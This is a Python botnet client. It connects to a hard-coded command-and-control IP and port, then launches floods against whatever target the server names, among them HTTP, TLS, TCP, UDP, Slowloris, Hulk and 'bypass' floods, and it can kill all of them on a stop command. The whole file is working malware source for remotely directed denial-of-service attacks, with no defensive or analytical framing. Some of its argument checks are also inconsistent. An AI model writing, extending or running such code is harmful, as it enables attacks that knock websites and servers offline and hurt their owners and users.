import socket
import subprocess
import os
from datetime import datetime

SERVER_HOST = '45.150.34.16'
SERVER_PORT = 5511

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_HOST, SERVER_PORT))

print(f"⚡ Connected to C2 Server at {SERVER_HOST}:{SERVER_PORT}")

def format_duration(seconds):
    mins, secs = divmod(seconds, 60)
    return f"{mins:02d}m {secs:02d}s"

def execute_command(cmd):
    start_time = datetime.now()
    try:
        parts = cmd.split()

        if cmd.startswith("http-raw"):
            if len(parts) < 3:
                print("❌ Usage: http-raw <url> <time>")
                return
            print(f"🚀 Starting HTTP-RAW attack on {parts[1]}")
            subprocess.Popen(["node", "HTTP-RAW", parts[1], parts[2]])

        elif cmd.startswith("crash"):
            if len(parts) < 3:
                print("❌ Usage: crash <url> <GET/POST>")
                return
            print(f"💥 Starting Crash attack on {parts[1]}")
            subprocess.Popen(["go", "run", "Hulk.go", "-site", parts[1], "-data", parts[2]])

        elif cmd.startswith("httpflood"):
            if len(parts) < 5:
                print("❌ Usage: httpflood <url> <threads> <GET/POST> <time>")
                return
            print(f"🌊 Starting HTTPFlood with {parts[2]} threads")
            subprocess.Popen(["go", "run", "httpflood.go", parts[1], parts[2], parts[3], parts[4], "nil"])

        elif cmd.startswith("stdv2"):
            if len(parts) < 3:
                print("❌ Usage: stdv2 <ip> <port>")
                return
            print(f"🔫 Launching STDv2 on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./std", parts[1], parts[2]])

        elif cmd.startswith("slowloris"):
            if len(parts) < 3:
                print("❌ Usage: slowloris <ip> <port>")
                return
            print(f"🐌 Launching Slowloris on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./slowloris", parts[1], parts[2]])

        elif cmd.startswith("tcp"):
            if len(parts) < 6:
                print("❌ Usage: tcp <method> <ip> <port> <time> <connections>")
                return
            print(f"📡 Launching TCP Flood {parts[1]} on {parts[2]}:{parts[3]} with {parts[5]} connections")
            subprocess.Popen(["./100UP-TCP", parts[1], parts[2], parts[3], parts[4], parts[5]])

        elif cmd.startswith("tlsflood"):
            if len(parts) < 5:
                print("❌ Usage: tlsflood <url> <time>")
                return
            print(f"🔐 Starting TLS Flood on {parts[1]} for {parts[4]}s")
            subprocess.Popen(["node", "tls.js", parts[1], parts[4]])

        # New methods added below
        elif cmd.startswith("ovh-raw"):
            if len(parts) < 6:
                print("❌ Usage: ovh-raw <method> <ip> <port> <time> <connections>")
                return
            print(f"🔄 Starting OVH-RAW {parts[1]} attack on {parts[2]}:{parts[3]}")
            subprocess.Popen(["./ovh-raw", parts[1], parts[2], parts[3], parts[4], parts[5]])

        elif cmd.startswith("udp"):
            if len(parts) < 3:
                print("❌ Usage: udp <ip> <port>")
                return
            print(f"📨 Starting UDP Flood on {parts[1]}:{parts[2]}")
            subprocess.Popen(["python3", "udp.py", parts[1], parts[2], "0", "0"])

        elif cmd.startswith("std"):
            if len(parts) < 3:
                print("❌ Usage: std <ip> <port>")
                return
            print(f"💣 Starting STD NoSpoof on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./STD-NOSPOOF", parts[1], parts[2]])

        elif cmd.startswith("udpbypass"):
            if len(parts) < 3:
                print("❌ Usage: udpbypass <ip> <port>")
                return
            print(f"🚪 Starting UDP Bypass on {parts[1]}:{parts[2]}")
            subprocess.Popen(["./UDPBYPASS", parts[1], parts[2]])

        elif cmd.startswith("https-spoof"):
            if len(parts) < 4:
                print("❌ Usage: https-spoof <url> <time> <threads>")
                return
            print(f"🔓 Starting HTTPS Spoof on {parts[1]} with {parts[3]} threads")
            subprocess.Popen(["python3", "https-spoof.py", parts[1], parts[2], parts[3]])

        elif cmd.startswith("slow"):
            if len(parts) < 3:
                print("❌ Usage: slow <url> <time>")
                return
            print(f"🐢 Starting Slow attack on {parts[1]}")
            subprocess.Popen(["node", "slow.js", parts[1], parts[2]])

        elif cmd.startswith("hyper"):
            if len(parts) < 3:
                print("❌ Usage: hyper <url> <time>")
                return
            print(f"⚡ Starting Hyper attack on {parts[1]}")
            subprocess.Popen(["node", "hyper.js", parts[1], parts[2]])

        elif cmd.startswith("http-rand"):
            if len(parts) < 3:
                print("❌ Usage: http-rand <url> <time>")
                return
            print(f"🎲 Starting HTTP Random attack on {parts[1]}")
            subprocess.Popen(["node", "HTTP-RAND.js", parts[1], parts[2]])

        elif cmd.startswith("httpget"):
            if len(parts) < 2:
                print("❌ Usage: httpget <url>")
                return
            print(f"📥 Starting HTTP GET flood on {parts[1]}")
            subprocess.Popen(["./httpget", parts[1], "10000", "50", "100"])

        elif cmd.startswith("stop"):
            print("🛑 Stopping all attacks")
            # Add all new process killers
            os.system("pkill -f HTTP-RAW")
            os.system("pkill -f Hulk.go")
            os.system("pkill -f httpflood.go")
            os.system("pkill -f std")
            os.system("pkill -f slowloris")
            os.system("pkill -f 100UP-TCP")
            os.system("pkill -f tls.js")
            os.system("pkill -f ovh-raw")
            os.system("pkill -f udp.py")
            os.system("pkill -f STD-NOSPOOF")
            os.system("pkill -f UDPBYPASS")
            os.system("pkill -f https-spoof.py")
            os.system("pkill -f slow.js")
            os.system("pkill -f hyper.js")
            os.system("pkill -f HTTP-REQUESTS.js")
            os.system("pkill -f HTTP-RAND.js")
            os.system("pkill -f httpget.js")

        duration = (datetime.now() - start_time).total_seconds()
        print(f"✅ Command executed in {format_duration(int(duration))}")

    except Exception as e:
        print(f"❌ Error: {e}")

while True:
    try:
        command = client.recv(1024).decode()
        if not command:
            break
        execute_command(command)
    except KeyboardInterrupt:
        print("\n⚠️ Client shutting down...")
        client.close()
        break
    except Exception as e:
        print(f"❌ Connection error: {e}")
        client.close()
        break